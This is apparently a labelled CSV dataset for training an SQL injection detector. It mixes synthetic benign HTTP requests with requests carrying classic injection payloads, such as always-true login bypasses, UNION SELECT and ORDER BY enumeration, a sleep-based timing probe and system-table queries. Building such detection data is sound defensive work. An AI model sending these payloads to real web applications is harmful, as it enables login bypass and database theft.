text,flow_duration,label
GET /search?q=m,72500,0
GET /search.aspx?q=' AND user IS NULL; --,20177,1
GET /search?q=G,116648,0
"POST /login {'user': 'W', 'pass': 'password123'}",25603,0
GET /api/v1/users?id=admin' #,957,1
GET /search?q=K,9355,0
GET /search?q=/,112961,1
GET /api/v1/users?id=425,43851,0
POST /profile/update {'email': 'test.user@example.com'},84636,0
POST /search {'keyword': '1' and '1'='1'},92457,1
GET /api/v1/users?id=3143,83299,0
GET /products/details?productID=4,43883,0
"POST /login {'user': '1' OR '1'='1' --', 'pass': 'password123'}",70583,1
GET /products/details?productID=w,83200,0
GET /api/v1/users?id=5639,21584,0
"POST /api/v1/cart/add {'item_id': '9746', 'quantity': 4}",22425,0
GET /search?q=1 AND 1=1,95334,1
"POST /api/v1/cart/add {'item_id': '3574', 'quantity': 5}",51375,0
GET /search?q=V,10750,0
GET /images/products/T.jpg,56222,0
"POST /login {'user': '""""', 'pass': 'password123'}",149798,1
GET /assets/css/main.css,72502,0
GET /blog/posts?page=12,96511,0
POST /profile/update {'email': 'test.user@example.com'},4913,0
GET /search?q=' OR '1'='1,31009,1
"POST /api/v1/cart/add {'item_id': '9729', 'quantity': 1}",49753,0
"POST /api/v1/cart/add {'item_id': '5776', 'quantity': 1}",42914,0
GET /products/home/g,43614,0
GET /search?q=w,89028,0
GET /user/profile?user_id=1024-2,7066,1
"POST /login.php {'username': '%00', 'password': 'password'}",2377,1
GET /index.php?page=' AND user IS NULL; --,7490,1
"POST /login.php {'username': '' GROUP BY columnnames having 1=1 --', 'password': 'password'}",83675,1
"POST /login {'user': '1' OR '1'='1' --', 'pass': 'password123'}",75102,1
"POST /login {'user': 'w', 'pass': 'password123'}",130023,0
POST /profile/update {'email': 'test.user@example.com'},135293,0
GET /blog/posts?page=11,64304,0
"GET /search?q=1' GROUP BY 1,2,--+",6971,1
GET /api/v1/users?id=1396,67961,0
GET /api/v1/users?id=7255,46914,0
GET /api/v1/users?id=OR+%271%27%3D%271,5774,1
"GET /user/profile?user_id=""""",78998,1
GET /blog/posts?page=17,107880,0
"POST /login {'user': 'g', 'pass': 'password123'}",45669,0
"POST /search {'keyword': '' AND MID(VERSION(),1,1) = '5';'}",7833,1
GET /blog/posts?page=2,17303,0
GET /search?q=F,54674,0
"POST /login {'user': '' OR 1=1--', 'pass': 'password123'}",101733,1
GET /api/v1/users?id=1533,26430,0
GET /items/show.php?id=x' or 1=1--,319,1
GET /assets/css/main.css,48270,0
GET /products/home/n,51579,0
GET /products/details?productID=OR+%271%27%3D%271,92982,1
POST /search {'keyword': '' or 'x'='x'},809,1
POST /search {'keyword': '1*1'},7261,1
GET /index.php?page=' OR 1=1 /*,5650,1
GET /products/details?productID=h,29053,0
"POST /login {'user': 'F', 'pass': 'password123'}",50702,0
POST /profile/update {'email': 'test.user@example.com'},58978,0
POST /profile/update {'email': 'test.user@example.com'},87569,0
GET /api/v1/users?id=1810,17506,0
"POST /login {'user': '' AND MID(VERSION(),1,1) = '5';', 'pass': 'password123'}",149156,1
"POST /login {'user': 'z', 'pass': 'password123'}",12252,0
GET /items/show.php?id=1' OR '1'='1' --,51762,1
GET /api/v1/users?id=8283,51243,0
"POST /login {'user': 'S', 'pass': 'password123'}",119709,0
"POST /login {'user': 'b', 'pass': 'password123'}",27596,0
GET /products/details?productID=R,10888,0
GET /blog/posts?page=5,60436,0
GET /api/v1/users?id=' OR 1=1 /*,2541,1
"POST /login.php {'username': 'x' or 1=1--', 'password': 'password'}",29842,1
GET /products/home/s,76208,0
GET /products/details?productID=OR+%271%27%3D%271,53807,1
GET /items/show.php?id=' OR 1 -- -,3380,1
GET /admin/login?user=' or 'x'='x,52038,1
POST /profile/update {'email': 'test.user@example.com'},100653,0
GET /images/products/d.jpg,77427,0
GET /admin/login?user=1=1,38701,1
"POST /api/v1/cart/add {'item_id': '6341', 'quantity': 1}",52121,0
POST /profile/update {'email': 'test.user@example.com'},109128,0
GET /products/details?productID=OR '1'='1',3760,1
GET /assets/css/main.css,64503,0
GET /api/v1/users?id=' OR '1,4979,1
GET /search?q=Z,12523,0
GET /search.aspx?q=smith' OR '1'='1,44173,1
"POST /login {'user': '' OR '1'='1', 'pass': 'password123'}",21707,1
GET /user/profile?user_id=1' and '1'='1,539,1
GET /user/profile?user_id=1' OR '1'='1' --,27846,1
GET /images/products/X.jpg,32857,0
GET /images/products/q.jpg,72306,0
"POST /login {'user': 'H', 'pass': 'password123'}",17260,0
GET /admin/login?user=1 AND 1=1,827,1
GET /products/details?productID=1' OR '1'='1' --,7122,1
"POST /api/v1/cart/add {'item_id': '1042', 'quantity': 1}",16087,0
GET /admin/login?user=105-1,268,1
"POST /login.php {'username': ''admin'--', 'password': 'password'}",135175,1
GET /blog/posts?page=19,87116,0
"POST /login {'user': 'o', 'pass': 'password123'}",109550,0
GET /search.aspx?q=admin' #,2964,1
"POST /login {'user': 'c', 'pass': 'password123'}",71770,0
GET /products/details?productID=w,136797,0
GET /api/v1/users?id='admin'--,5575,1
GET /products/details?productID=F,38334,0
GET /products/details?productID=1*56,121812,1
"POST /login.php {'username': '' OR '1'='1', 'password': 'password'}",55568,1
GET /api/v1/users?id=8564,12755,0
GET /search.aspx?q=AND 1,33709,1
GET /search.aspx?q=' AND user IS NULL; --,7804,1
GET /blog/posts?page=10,132381,0
GET /products/details?productID=1=1,2458,1
"POST /login {'user': 'O', 'pass': 'password123'}",42413,0
GET /search?q=7,110329,0
"POST /login {'user': '' OR 1=1--', 'pass': 'password123'}",26512,1
GET /images/products/1.jpg,70236,0
GET /search.aspx?q='=',1364,1
GET /admin/login?user=' OR 'x'='x,68324,1
GET /blog/posts?page=3,40163,0
GET /api/v1/users?id='admin'--,87282,1
GET /api/v1/users?id=4854,85535,0
"POST /login {'user': 'smith' OR '1'='1', 'pass': 'password123'}",80,1
GET /admin/login?user=' OR 'x'='x,56487,1
"POST /login {'user': '""""', 'pass': 'password123'}",4100,1
GET /search?q=smith' OR '1'='1,116052,1
GET /search?q=l,146181,0
"POST /login {'user': 'OR+%271%27%3D%271', 'pass': 'password123'}",7183,1
"POST /login {'user': 'E', 'pass': 'password123'}",12008,0
GET /images/products/n.jpg,86432,0
GET /products/details?productID=;,106495,1
GET /assets/css/main.css,130618,0
GET /admin/login?user=1' ORDER BY 3--+,120778,1
GET /products/details?productID=' AND user IS NULL; --,4697,1
GET /search?q=1=1,6878,1
GET /search?q=OR+%271%27%3D%271,834,1
"POST /login {'user': '1' and '1'='1', 'pass': 'password123'}",142115,1
GET /products/details?productID=z,43061,0
"POST /login {'user': 'J', 'pass': 'password123'}",74304,0
"GET /items/show.php?id=1' GROUP BY 1,2,--+",1420,1
GET /items/show.php?id='admin'--,40655,1
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",15584,1
GET /api/v1/users?id=8024,64650,0
"POST /api/v1/cart/add {'item_id': '1914', 'quantity': 3}",43089,0
GET /user/profile?user_id=-- or #,6828,1
GET /api/v1/users?id=' or 'x'='x,60523,1
"POST /login {'user': 'OR+%271%27%3D%271', 'pass': 'password123'}",1384,1
POST /search {'keyword': '1=1'},6907,1
"POST /login {'user': ''admin'--', 'pass': 'password123'}",3326,1
GET /search?q=g,7492,0
"POST /api/v1/cart/add {'item_id': '9888', 'quantity': 1}",53545,0
GET /products/details?productID=m,13328,0
GET /search?q=1024-2,7402,1
GET /api/v1/users?id=9726,67915,0
GET /blog/posts?page=6,53562,0
"POST /login.php {'username': '%00', 'password': 'password'}",5961,1
POST /search {'keyword': 'user1' or 1=1 --'},73027,1
GET /search?q=A,50747,0
GET /blog/posts?page=14,144063,0
GET /api/v1/users?id=9469,91607,0
GET /index.php?page=1 AND 1=1,178,1
GET /search?q=y,32687,0
GET /api/v1/users?id=3185,83132,0
"POST /login.php {'username': '' or 'x'='x', 'password': 'password'}",3202,1
GET /products/details?productID=K,84576,0
GET /search.aspx?q=admin' #,767,1
GET /search.aspx?q=1=1,93088,1
GET /api/v1/users?id=1024-2,92640,1
GET /blog/posts?page=5,122359,0
GET /blog/posts?page=12,139119,0
GET /api/v1/users?id=' OR 'x'='x,112369,1
GET /items/show.php?id=' OR '' = ',85264,1
GET /items/show.php?id=/*…*/,2143,1
GET /search?q=105-1,6643,1
GET /images/products/3.jpg,50020,0
GET /api/v1/users?id=1155,14061,0
GET /products/details?productID=K,5427,0
GET /search?q=' or 1=1 limit 1 --,857,1
GET /images/products/v.jpg,89976,0
GET /index.php?page=user1' or 1=1 --,3988,1
GET /api/v1/users?id=' or 'x'='x,5233,1
GET /admin/login?user=' OR 'x'='x,3969,1
GET /images/products/I.jpg,17113,0
GET /products/details?productID=1*1,1605,1
GET /search.aspx?q=AND true,123604,1
GET /products/details?productID=' OR 'x'='x,10672,1
"POST /login {'user': '' OR 1=1 /*', 'pass': 'password123'}",59753,1
"POST /api/v1/cart/add {'item_id': '8060', 'quantity': 4}",77180,0
GET /index.php?page=smith' OR '1'='1,3574,1
GET /admin/login?user=1' ORDER BY 3--+,2504,1
"POST /login {'user': '/', 'pass': 'password123'}",83448,1
GET /products/details?productID=V,141559,0
"POST /login {'user': 'c', 'pass': 'password123'}",48881,0
GET /api/v1/users?id=8532,48122,0
GET /api/v1/users?id=5531,135747,0
GET /images/products/y.jpg,80623,0
"POST /login {'user': 'N', 'pass': 'password123'}",64956,0
GET /api/v1/users?id=1*1,2851,1
GET /blog/posts?page=14,15735,0
"POST /login {'user': 'S', 'pass': 'password123'}",10606,0
"POST /login {'user': 'o', 'pass': 'password123'}",40753,0
GET /search?q=s,50242,0
GET /user/profile?user_id=OR+%271%27%3D%271,115106,1
GET /products/details?productID=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,64126,1
"POST /login {'user': 'y', 'pass': 'password123'}",95544,0
GET /api/v1/users?id=1003,28769,0
GET /products/details?productID=g,50413,0
POST /profile/update {'email': 'test.user@example.com'},87442,0
GET /images/products/C.jpg,263,0
GET /api/v1/users?id=;,120278,1
GET /products/electronics/Z,149667,0
GET /products/details?productID=N,3333,0
GET /search?q=d,137663,0
GET /api/v1/users?id=9276,44952,0
"POST /login.php {'username': 'user1' or 1=1 --', 'password': 'password'}",58420,1
"POST /api/v1/cart/add {'item_id': '8044', 'quantity': 4}",82037,0
GET /index.php?page=1' ORDER BY 1--+,68049,1
GET /search?q=X,74541,0
GET /search?q=V,134476,0
GET /search?q=U,81220,0
GET /products/details?productID=x,54504,0
GET /admin/login?user=smith' OR '1'='1,82832,1
POST /profile/update {'email': 'test.user@example.com'},3210,0
GET /assets/css/main.css,16024,0
GET /products/details?productID=' OR '1,7164,1
GET /search?q=1 AND 1=1,3670,1
GET /products/details?productID=o,143705,0
GET /search?q='LIKE',130282,1
GET /products/details?productID=smith' OR '1'='1,101941,1
GET /blog/posts?page=11,78177,0
GET /images/products/n.jpg,73651,0
GET /index.php?page=user1' or 1=1 --,96,1
"POST /login {'user': 'w', 'pass': 'password123'}",53705,0
GET /products/details?productID=1*1,6679,1
"POST /api/v1/cart/add {'item_id': '9065', 'quantity': 2}",82545,0
"POST /api/v1/cart/add {'item_id': '6341', 'quantity': 4}",65701,0
GET /search?q=q,85689,0
"GET /index.php?page=1' GROUP BY 1,2,--+",4811,1
"POST /api/v1/cart/add {'item_id': '4166', 'quantity': 3}",33155,0
"POST /login {'user': 'y', 'pass': 'password123'}",107124,0
GET /images/products/N.jpg,148087,0
POST /profile/update {'email': 'test.user@example.com'},24066,0
"POST /login {'user': 'l', 'pass': 'password123'}",39932,0
GET /admin/login?user=1024-2,146292,1
GET /api/v1/users?id=4335,54723,0
"POST /login {'user': '' OR '1', 'pass': 'password123'}",1453,1
GET /search?q=' AND user IS NULL; --,119871,1
GET /images/products/Z.jpg,96882,0
"POST /login.php {'username': 'smith' OR '1'='1', 'password': 'password'}",59659,1
GET /products/details?productID=' or 'x'='x,7330,1
GET /search?q=user1' or 1=1 --,7551,1
GET /products/details?productID=r,79264,0
"POST /login {'user': 'a', 'pass': 'password123'}",115791,0
"POST /login {'user': '' OR 1 -- -', 'pass': 'password123'}",90237,1
GET /api/v1/users?id=OR+%271%27%3D%271,1362,1
GET /products/details?productID=1' and '1'='1,35577,1
GET /api/v1/users?id='=',7211,1
POST /search {'keyword': '' OR 1=1--'},7077,1
GET /blog/posts?page=5,39923,0
"GET /api/v1/users?id=1' GROUP BY 1,2,--+",5431,1
GET /api/v1/users?id=9214,47108,0
"POST /login {'user': ''admin'--', 'pass': 'password123'}",121025,1
"POST /login.php {'username': '1*1', 'password': 'password'}",19818,1
GET /images/products/n.jpg,89632,0
GET /api/v1/users?id=3791,137168,0
GET /search?q=F,9732,0
GET /products/details?productID=/,6375,1
GET /search.aspx?q=OR '1'='1',4812,1
GET /items/show.php?id=%2c(select%20*%20from%20(select(sleep(10)))a),110895,1
"POST /login {'user': '' or 'x'='x', 'pass': 'password123'}",47351,1
GET /search?q=OR+%271%27%3D%271,2432,1
GET /user/profile?user_id=OR+%271%27%3D%271,20572,1
"POST /api/v1/cart/add {'item_id': '9235', 'quantity': 2}",146946,0
GET /assets/css/main.css,4788,0
GET /products/home/h,34359,0
POST /search {'keyword': '' OR 'x'='x'},29740,1
GET /api/v1/users?id=514,64799,0
GET /user/profile?user_id=x' or 1=1--,129758,1
GET /search.aspx?q=OR+%271%27%3D%271,4900,1
GET /search?q=x,52985,0
"POST /login {'user': '' OR 1 -- -', 'pass': 'password123'}",6207,1
"GET /search?q=1' ORDER BY 1,2,3--+",74114,1
POST /profile/update {'email': 'test.user@example.com'},13668,0
"POST /login {'user': 'E', 'pass': 'password123'}",102177,0
GET /items/show.php?id=105-1,82986,1
"POST /login {'user': 'r', 'pass': 'password123'}",55786,0
GET /search?q=105-1,113454,1
GET /images/products/m.jpg,3565,0
"POST /login.php {'username': '1*1', 'password': 'password'}",65544,1
"POST /login {'user': 'r', 'pass': 'password123'}",69336,0
GET /api/v1/users?id='admin'--,90122,1
GET /search?q=smith' OR '1'='1,94346,1
GET /products/details?productID=u,97803,0
POST /profile/update {'email': 'test.user@example.com'},20805,0
"GET /api/v1/users?id=1' ORDER BY 1,2--+",1051,1
GET /search?q=x,134144,0
GET /products/electronics/9,75156,0
GET /search?q=8,123257,0
GET /items/show.php?id=smith' OR '1'='1,37558,1
GET /user/profile?user_id=`,8681,1
"POST /login {'user': ''admin'--', 'pass': 'password123'}",2947,1
GET /search.aspx?q=\\,688,1
GET /images/products/n.jpg,73428,0
"POST /login {'user': 'x' or 1=1--', 'pass': 'password123'}",25486,1
GET /blog/posts?page=6,56631,0
GET /api/v1/users?id=9437,67933,0
POST /search {'keyword': '' OR '1'},3460,1
GET /search?q=C,51819,0
GET /api/v1/users?id=4338,47680,0
GET /api/v1/users?id=8018,36066,0
GET /products/details?productID=v,146992,0
GET /admin/login?user=user1' or 1=1 --,3043,1
"POST /api/v1/cart/add {'item_id': '2284', 'quantity': 3}",124203,0
GET /admin/login?user=OR+%271%27%3D%271,61641,1
"POST /login {'user': 'z', 'pass': 'password123'}",52798,0
GET /items/show.php?id=' OR '1,3079,1
"POST /login {'user': '1' ORDER BY 1--+', 'pass': 'password123'}",22743,1
"POST /login {'user': 'd', 'pass': 'password123'}",28375,0
GET /products/details?productID=E,88820,0
GET /items/show.php?id=admin' #,2378,1
GET /products/details?productID=c,59836,0
"POST /login {'user': '' AND MID(VERSION(),1,1) = '5';', 'pass': 'password123'}",143276,1
GET /items/show.php?id=1' ORDER BY 3--+,123134,1
GET /assets/css/main.css,116536,0
GET /assets/css/main.css,40704,0
GET /products/details?productID=1' and '1'='1,1177,1
GET /products/details?productID=g,65179,0
GET /items/show.php?id=1' ORDER BY 1--+,24988,1
GET /user/profile?user_id=' OR 'x'='x,37844,1
GET /search.aspx?q=105-1,49597,1
POST /profile/update {'email': 'test.user@example.com'},18927,0
"POST /login {'user': 'w', 'pass': 'password123'}",50430,0
GET /products/details?productID=r,76495,0
GET /items/show.php?id=' OR 'x'='x,93407,1
GET /api/v1/users?id=7117,60166,0
"GET /search.aspx?q=-1 UNION SELECT 1 INTO @,@",5678,1
GET /index.php?page=' OR 1=1 /*,4157,1
GET /user/profile?user_id=' OR '1,33036,1
GET /blog/posts?page=15,16503,0
GET /api/v1/users?id=1' ORDER BY 2--+,726,1
"POST /api/v1/cart/add {'item_id': '6897', 'quantity': 2}",7176,0
GET /search?q=' UNION SELECT sum(columnname) from tablename --,1854,1
GET /admin/login?user=OR '1'='1',82334,1
GET /user/profile?user_id=1 AND 1=1,4097,1
"POST /login {'user': ''='', 'pass': 'password123'}",37624,1
GET /api/v1/users?id=2973,75144,0
GET /blog/posts?page=8,72621,0
"POST /login.php {'username': '1' OR '1'='1' --', 'password': 'password'}",2768,1
GET /products/electronics/E,41952,0
"POST /login {'user': 'u', 'pass': 'password123'}",28978,0
GET /images/products/w.jpg,38033,0
GET /search?q=smith' OR '1'='1,145600,1
"POST /login {'user': 'h', 'pass': 'password123'}",85764,0
GET /assets/css/main.css,66583,0
GET /products/details?productID='''''''''''''UNION SELECT '2,7407,1
GET /products/details?productID=E,138588,0
GET /assets/css/main.css,50575,0
GET /user/profile?user_id=OR+%271%27%3D%271,4417,1
"GET /api/v1/users?id="" OR """" = """,4413,1
POST /search {'keyword': '' UNION SELECT sum(columnname) from tablename --'},14261,1
"POST /login {'user': '' UNION SELECT sum(columnname) from tablename --', 'pass': 'password123'}",115732,1
GET /images/products/q.jpg,126418,0
GET /search?q=f,87979,0
GET /search?q=' AND user IS NULL; --,129278,1
"POST /login {'user': 'OR '1'='1'', 'pass': 'password123'}",5419,1
GET /images/products/1.jpg,23524,0
POST /profile/update {'email': 'test.user@example.com'},86062,0
GET /images/products/c.jpg,62030,0
GET /items/show.php?id=1=1,3302,1
GET /items/show.php?id=1 AND 1=1,4821,1
GET /search?q=8,118213,0
GET /images/products/2.jpg,45845,0
GET /api/v1/users?id=8624,43558,0
GET /user/profile?user_id=%00,7036,1
GET /products/details?productID=E,52806,0
POST /profile/update {'email': 'test.user@example.com'},62571,0
GET /api/v1/users?id=6098,6306,0
GET /api/v1/users?id=' OR 1=1--,91598,1
GET /api/v1/users?id=1' ORDER BY 2--+,3076,1
GET /api/v1/users?id=OR+%271%27%3D%271,125931,1
GET /products/details?productID=' or 1=1 limit 1 --,48969,1
GET /search.aspx?q=' AND id IS NULL; --,7711,1
GET /search?q=1024-2,272,1
"POST /login {'user': 'F', 'pass': 'password123'}",69471,0
"POST /login {'user': 'e', 'pass': 'password123'}",3963,0
"POST /login.php {'username': '' AND user IS NULL; --', 'password': 'password'}",6640,1
GET /search?q=w,6731,0
GET /items/show.php?id=OR '1'='1',1223,1
GET /products/home/v,60253,0
GET /images/products/v.jpg,104656,0
POST /search {'keyword': 'OR '1'='1''},126435,1
GET /products/books/6,40018,0
GET /products/home/e,48627,0
"POST /login {'user': '/*…*/', 'pass': 'password123'}",1655,1
GET /api/v1/users?id=' AND user IS NULL; --,137539,1
GET /search?q=p,11024,0
"POST /login.php {'username': '1=1', 'password': 'password'}",72179,1
GET /api/v1/users?id=383,31640,0
GET /api/v1/users?id=1119,65493,0
GET /search?q=z,90762,0
GET /index.php?page=1' OR '1'='1' --,37072,1
GET /user/profile?user_id=' OR 'x'='x,7414,1
GET /search?q=y,132757,0
GET /search?q=OR+%271%27%3D%271,3863,1
"POST /login.php {'username': '1' ORDER BY 1,2--+', 'password': 'password'}",6805,1
GET /api/v1/users?id=9955,129256,0
GET /products/details?productID=b,6040,0
GET /products/details?productID=8,9835,0
GET /admin/login?user=/*…*/,46429,1
GET /api/v1/users?id=5590,32777,0
GET /api/v1/users?id=7204,36250,0
"POST /api/v1/cart/add {'item_id': '7807', 'quantity': 5}",60988,0
GET /search?q=F,56033,0
GET /search?q=6,25525,0
GET /products/details?productID='',143595,1
GET /search.aspx?q='admin'--,5988,1
GET /products/home/0,35333,0
"POST /login {'user': '5', 'pass': 'password123'}",24942,0
GET /products/home/5,26384,0
GET /api/v1/users?id=%00,119770,1
GET /search?q=p,87703,0
GET /products/details?productID=z,55214,0
GET /products/details?productID=smith' OR '1'='1,5918,1
GET /search?q=' or 'x'='x,109751,1
GET /search?q=P,99743,0
GET /products/details?productID=\,146730,1
"POST /login {'user': '' AND user IS NULL; --', 'pass': 'password123'}",5529,1
GET /api/v1/users?id=3276,12436,0
GET /api/v1/users?id=5840,74720,0
GET /products/details?productID=user1' or 1=1 --,7924,1
GET /products/details?productID=t,62145,0
"GET /products/details?productID=1' GROUP BY 1,2,--+",6295,1
"POST /api/v1/cart/add {'item_id': '7376', 'quantity': 3}",138594,0
"POST /login {'user': '1' OR '1'='1' --', 'pass': 'password123'}",3489,1
GET /products/books/t,148903,0
GET /search?q=' OR 1=1--,119714,1
"POST /login {'user': 'Q', 'pass': 'password123'}",14203,0
GET /api/v1/users?id=470,74188,0
GET /api/v1/users?id=' OR 'x'='x,12548,1
GET /search?q=' or 1=1 limit 1 --,89087,1
"POST /api/v1/cart/add {'item_id': '2009', 'quantity': 5}",62548,0
GET /images/products/Z.jpg,81210,0
GET /images/products/T.jpg,50486,0
GET /api/v1/users?id=9060,89023,0
GET /api/v1/users?id=110,87511,0
"POST /api/v1/cart/add {'item_id': '4045', 'quantity': 3}",77163,0
GET /api/v1/users?id=2995,88193,0
POST /profile/update {'email': 'test.user@example.com'},21665,0
GET /api/v1/users?id=692,74486,0
"POST /api/v1/cart/add {'item_id': '5085', 'quantity': 4}",149910,0
GET /admin/login?user=1' ORDER BY 2--+,96583,1
GET /index.php?page=1*1,135777,1
GET /products/details?productID=P,21518,0
GET /index.php?page=1*1,90313,1
GET /products/details?productID=z,74520,0
"POST /login {'user': 'f', 'pass': 'password123'}",72100,0
GET /search?q=1,81994,0
"POST /login {'user': 'q', 'pass': 'password123'}",5502,0
GET /products/details?productID=0,114244,0
"POST /login {'user': 'w', 'pass': 'password123'}",76313,0
GET /api/v1/users?id=OR '1'='1',76060,1
"POST /login {'user': '8', 'pass': 'password123'}",22421,0
GET /products/details?productID=5,107109,0
"POST /login {'user': '9', 'pass': 'password123'}",83989,0
GET /blog/posts?page=17,139036,0
GET /assets/css/main.css,149816,0
GET /products/details?productID=' AND user IS NULL; --,7436,1
POST /profile/update {'email': 'test.user@example.com'},71044,0
"POST /login {'user': '1*56', 'pass': 'password123'}",1252,1
GET /items/show.php?id=1' and '1'='1,5671,1
GET /products/electronics/9,18561,0
GET /api/v1/users?id='admin'--,47203,1
GET /user/profile?user_id=user1' or 1=1 --,406,1
"POST /login {'user': '1', 'pass': 'password123'}",77972,0
"POST /login.php {'username': '' or 1=1 limit 1 --', 'password': 'password'}",39059,1
GET /api/v1/users?id=1164,5419,0
GET /admin/login?user=' or 'x'='x,4294,1
"POST /api/v1/cart/add {'item_id': '1028', 'quantity': 4}",50181,0
POST /profile/update {'email': 'test.user@example.com'},87143,0
GET /images/products/8.jpg,6117,0
GET /products/details?productID=n,76401,0
GET /images/products/k.jpg,45084,0
GET /search.aspx?q=' OR 'x'='x,1540,1
GET /search?q=1024-2,5024,1
POST /profile/update {'email': 'test.user@example.com'},25027,0
"POST /login {'user': '' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --', 'pass': 'password123'}",27456,1
"POST /login {'user': 'K', 'pass': 'password123'}",14502,0
"GET /products/details?productID=1' GROUP BY 1,2,3--+",2042,1
GET /admin/login?user=' OR 1=1 /*,48987,1
GET /products/books/a,26605,0
GET /images/products/k.jpg,74085,0
GET /assets/css/main.css,102599,0
GET /api/v1/users?id=' or 1=1 limit 1 --,1242,1
GET /products/details?productID=9,71523,0
GET /products/details?productID=user1' or 1=1 --,6054,1
GET /assets/css/main.css,50391,0
GET /products/electronics/e,48783,0
GET /search?q=' or 'x'='x,2179,1
GET /api/v1/users?id='',124026,1
"POST /login {'user': 'admin' #', 'pass': 'password123'}",103535,1
GET /products/details?productID=' OR 1=1 /*,145987,1
GET /user/profile?user_id=x' or 1=1--,1603,1
"POST /login.php {'username': 'OR '1'='1'', 'password': 'password'}",106059,1
"POST /api/v1/cart/add {'item_id': '3815', 'quantity': 5}",149904,0
GET /api/v1/users?id=4426,146076,0
GET /items/show.php?id=' OR '1'='1,1149,1
GET /api/v1/users?id=OR+%271%27%3D%271,50160,1
GET /search?q=F,130868,0
GET /search?q=' or 1=1 limit 1 --,787,1
"POST /api/v1/cart/add {'item_id': '4410', 'quantity': 1}",47042,0
GET /products/electronics/n,81714,0
GET /blog/posts?page=4,59020,0
GET /products/details?productID=f,5342,0
GET /products/details?productID=L,98830,0
GET /items/show.php?id=' OR 1=1 /*,6474,1
GET /index.php?page=x' or 1=1--,7259,1
GET /search.aspx?q=x' or 1=1--,145742,1
POST /profile/update {'email': 'test.user@example.com'},47402,0
GET /search?q=6,34545,0
GET /search?q=' OR 1=1 /*,145087,1
GET /search?q=u,7018,0
GET /index.php?page=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,6181,1
GET /api/v1/users?id=admin' #,1312,1
"POST /login {'user': 'E', 'pass': 'password123'}",145378,0
GET /products/details?productID=b,141319,0
"GET /admin/login?user="" OR 1 = 1 -- -",4676,1
GET /blog/posts?page=7,81407,0
